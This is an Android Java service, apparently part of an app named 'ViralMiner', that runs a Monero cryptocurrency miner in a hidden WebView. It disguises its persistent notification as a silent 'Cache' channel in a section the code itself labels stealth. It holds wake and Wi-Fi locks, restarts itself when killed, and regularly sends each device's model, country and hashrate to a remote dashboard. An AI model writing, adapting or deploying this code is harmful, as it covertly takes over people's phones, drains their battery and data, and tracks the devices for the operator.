package com.viralminer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Locale;
import java.util.UUID;

public class MinerService extends Service {

    private static final String TAG      = "ViralMiner";
    private static final String CHANNEL  = "cache_channel";
    private static final int    NOTIF_ID = 101;
    private static final long   PING_MS  = 60_000L;

    public static volatile boolean isRunning = false;

    private static final String LUA = """
        local sid=ARGV[1]
        local now=tonumber(ARGV[2])
        local cut=tonumber(ARGV[3])
        local isMiner=ARGV[4]
        local isFirst=ARGV[5]
        local mk='meta:'..sid
        redis.call('ZADD',KEYS[1],now,sid)
        redis.call('ZREMRANGEBYSCORE',KEYS[1],'-inf',cut)
        if isMiner=='1' then
          redis.call('ZADD',KEYS[2],now,sid)
          redis.call('ZREMRANGEBYSCORE',KEYS[2],'-inf',cut)
        else
          redis.call('ZREM',KEYS[2],sid)
        end
        if isFirst=='1' then
          redis.call('INCR',KEYS[3])
          redis.call('HSET',mk,'first',now)
        end
        redis.call('HSET',mk,'last',now,'hs',ARGV[6],'model',ARGV[7],'country',ARGV[8])
        redis.call('EXPIRE',mk,86400)
        return 1
        """;

    private WebView web;
    private PowerManager.WakeLock wake;
    private WifiManager.WifiLock wifiLock;
    private final Handler handler = new Handler(Looper.getMainLooper());

    private volatile int hashrate = 0;
    private int zeroMinutes = 0;
    private boolean firstPing = true;
    private String sid;

    private final Runnable watchdog = new Runnable() {
        @Override public void run() {
            if (hashrate <= 0) zeroMinutes++; else zeroMinutes = 0;
            if (zeroMinutes >= 5) {
                zeroMinutes = 0;
                Log.w(TAG, "5 min se hash nahi -> reload");
                loadMinerPage();
            }
            handler.postDelayed(this, 60_000L);
        }
    };

    private final Runnable pinger = new Runnable() {
        @Override public void run() { sendPing(); handler.postDelayed(this, PING_MS); }
    };

    private final Runnable notifUpdate = new Runnable() {
        @Override public void run() { pushNotification(); }
    };

    /* ================= lifecycle ================= */

    @Override public void onCreate() {
        super.onCreate();
        createChannel();
        goForeground("start ho raha hai…");
        acquireLocks();
        Watchdog.schedule(this);

        sid = getSharedPreferences("viral", MODE_PRIVATE).getString("sid", null);
        if (sid == null) {
            sid = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            getSharedPreferences("viral", MODE_PRIVATE).edit().putString("sid", sid).apply();
        }

        isRunning = true;
        loadMinerPage();
        handler.postDelayed(watchdog, 60_000L);
        handler.postDelayed(pinger, 15_000L);
    }

    @Override public int onStartCommand(Intent i, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onTaskRemoved(Intent root) { Watchdog.schedule(this); }

    @Override public void onDestroy() {
        isRunning = false;
        handler.removeCallbacksAndMessages(null);
        try { if (web != null) { web.loadUrl("about:blank"); web.destroy(); web = null; } }
        catch (Throwable ignored) { }
        try { if (wake != null && wake.isHeld()) wake.release(); } catch (Throwable ignored) { }
        try { if (wifiLock != null && wifiLock.isHeld()) wifiLock.release(); } catch (Throwable ignored) { }
        Watchdog.schedule(this);
        super.onDestroy();
    }

    /* ================= foreground (stealth) ================= */

    private void goForeground(String text) {
        Notification n = buildNotification(text);
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
            } else if (Build.VERSION.SDK_INT >= 29) {
                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(NOTIF_ID, n);
            }
        } catch (Throwable t) {
            Log.w(TAG, "startForeground " + t);
            startForeground(NOTIF_ID, n);
        }
    }

    /* ================= WebView miner ================= */

    private void loadMinerPage() {
        handler.post(new Runnable() {
            @Override public void run() {
                try {
                    if (web != null) { web.destroy(); web = null; }
                    WebView w = new WebView(MinerService.this);
                    WebSettings s = w.getSettings();
                    s.setJavaScriptEnabled(true);
                    s.setDomStorageEnabled(true);
                    s.setAllowFileAccess(true);
                    s.setAllowFileAccessFromFileURLs(true);
                    s.setAllowUniversalAccessFromFileURLs(true);
                    s.setMediaPlaybackRequiresUserGesture(false);
                    w.setWebChromeClient(new WebChromeClient());
                    w.addJavascriptInterface(new Bridge(), "Android");
                    w.measure(View.MeasureSpec.makeMeasureSpec(1080, View.MeasureSpec.EXACTLY),
                              View.MeasureSpec.makeMeasureSpec(1920, View.MeasureSpec.EXACTLY));
                    w.layout(0, 0, 1080, 1920);
                    web = w;
                    w.loadUrl("file:///android_asset/miner.html");
                    w.onResume();
                    w.resumeTimers();
                    Log.d(TAG, "miner page loaded");
                } catch (Throwable t) { Log.e(TAG, "loadMinerPage " + t); }
            }
        });
    }

    public class Bridge {
        @JavascriptInterface public String config() {
            try {
                JSONObject o = new JSONObject();
                o.put("wallet",   Config.XMR_WALLET);
                o.put("worker",   Config.WORKER);
                o.put("pool",     Config.POOL);
                o.put("server",   Config.RELAY);
                o.put("throttle", Config.THROTTLE);
                o.put("threads",  Config.threads());
                return o.toString();
            } catch (Throwable t) { return "{}"; }
        }
        @JavascriptInterface public void hashrate(int v) {
            if (v != hashrate) { hashrate = v; handler.post(notifUpdate); }
        }
        @JavascriptInterface public void log(String m) { Log.d(TAG, "[js] " + m); }
    }

    /* ================= notification ================= */

    private void createChannel() {
        NotificationManager nm = getSystemService(NotificationManager.class);
        NotificationChannel old = nm.getNotificationChannel(CHANNEL);
        if (old != null && old.getImportance() == NotificationManager.IMPORTANCE_MIN) return;
        if (old != null) nm.deleteNotificationChannel(CHANNEL);

        NotificationChannel ch = new NotificationChannel(
                CHANNEL, "Cache", NotificationManager.IMPORTANCE_MIN);
        ch.setShowBadge(false);
        ch.enableVibration(false);
        ch.setSound(null, null);
        ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
        nm.createNotificationChannel(ch);
    }

    private Notification buildNotification(String text) {
        PendingIntent open = PendingIntent.getActivity(this, 0,
                new Intent(this, MainActivity.class),
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

        Intent stop = new Intent(this, ActionReceiver.class);
        stop.setAction(ActionReceiver.ACTION_STOP);
        PendingIntent piStop = PendingIntent.getBroadcast(this, 1, stop,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

        Notification.Builder b = new Notification.Builder(this, CHANNEL)
                .setContentTitle(Config.NOTIF_TITLE)
                .setContentText(text)
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentIntent(open)
                .setOngoing(true)
                .setOnlyAlertOnce(true)
                .setShowWhen(false)
                .setSilent(true)
                .setPriority(Notification.PRIORITY_MIN)
                .setVisibility(Notification.VISIBILITY_SECRET)
                .addAction(new Notification.Action.Builder(null, "Stop", piStop).build());

        if (Build.VERSION.SDK_INT >= 31) {
            b.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
        }
        return b.build();
    }

    private void pushNotification() {
        try {
            getSystemService(NotificationManager.class).notify(
                    NOTIF_ID,
                    buildNotification(Config.NOTIF_TEXT + " · " + hashrate + " H/s"));
        } catch (Throwable ignored) { }
    }

    /* ================= locks ================= */

    private void acquireLocks() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wake = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "viral:miner");
                wake.setReferenceCounted(false);
                wake.acquire();
            }
        } catch (Throwable t) { Log.w(TAG, "wakelock " + t); }

        try {
            WifiManager wm = (WifiManager) getApplicationContext()
                    .getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "viral:wifi");
                wifiLock.setReferenceCounted(false);
                wifiLock.acquire();
            }
        } catch (Throwable t) { Log.w(TAG, "wifilock " + t); }
    }

    /* ================= dashboard ping ================= */

    private void sendPing() {
        if (Config.UPSTASH_URL == null || Config.UPSTASH_URL.length() < 12) return;

        final String sidLocal = sid;
        final String first    = firstPing ? "1" : "0";
        final String hs       = String.valueOf(hashrate);
        final String model    = Build.MANUFACTURER + " " + Build.MODEL;
        final String country  = Locale.getDefault().getCountry();
        firstPing = false;

        new Thread(new Runnable() {
            @Override public void run() {
                HttpURLConnection c = null;
                try {
                    JSONArray a = new JSONArray();
                    a.put("EVAL"); a.put(LUA); a.put(4);
                    a.put("live:visitors"); a.put("live:miners");
                    a.put("stat:visits");   a.put("stat:clicks");
                    a.put(sidLocal);
                    a.put(String.valueOf(System.currentTimeMillis() / 1000));
                    a.put("180");
                    a.put("1");
                    a.put(first);
                    a.put(hs); a.put(model); a.put(country);

                    c = (HttpURLConnection) new URL(Config.UPSTASH_URL).openConnection();
                    c.setRequestMethod("POST");
                    c.setRequestProperty("Authorization", "Bearer " + Config.UPSTASH_TOKEN);
                    c.setRequestProperty("Content-Type", "application/json");
                    c.setDoOutput(true);
                    c.setConnectTimeout(15000);
                    c.setReadTimeout(15000);
                    OutputStream os = c.getOutputStream();
                    os.write(a.toString().getBytes("UTF-8"));
                    os.flush(); os.close();
                    int code = c.getResponseCode();
                    if (code >= 400) Log.w(TAG, "ping http " + code);
                } catch (Throwable t) { Log.w(TAG, "ping fail " + t); }
                finally { if (c != null) c.disconnect(); }
            }
        }, "ping").start();
    }
}
